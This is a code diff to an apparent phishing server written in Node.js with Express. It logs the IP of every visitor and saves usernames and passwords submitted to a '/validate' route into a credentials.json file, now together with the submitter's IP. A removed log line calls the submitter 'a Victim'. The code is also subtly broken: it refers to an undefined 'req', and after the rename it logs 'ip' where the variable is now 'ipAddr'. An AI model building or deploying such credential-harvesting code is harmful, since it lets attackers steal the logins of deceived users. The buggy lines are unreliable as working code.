@@ -86,7 +86,7 @@ app.use(bodyParser.json());
 app.get('/', function(request, response) {
 	response.sendFile(args.template);
 	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
-	console.log(ip + " Connected To Server.");
+	console.log(ip + " Connected.");
 
 	addJSON(
 		path.resolve(path.join(__dirname, '../output/ipAddr.json')),
@@ -97,16 +97,17 @@ app.get('/', function(request, response) {
 app.post('/validate', function(request, response) {
 	const username = request.body.username;
 	const password = request.body.password;
-	const ip = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
-	console.log(ip + " is now a Victim");
+	const ipAddr = request.headers['x-forwarded-for'] || req.connection.remoteAddress;
+	console.log(ip + " Submitted.");
 	if (username && password) {
-		console.log("USR: " + username);
-		console.log("PASWD: " + password);
+		console.log("USERNAME: " + username);
+		console.log("PASSWORD: " + password);
 		addJSON(
 			path.resolve(path.join(__dirname, '../output/credentials.json')),
 			{
-				usrname: username,
-				passwd: password
+				username: username,
+				password: password,
+				ip: ipAddr
 			}
 		)
 
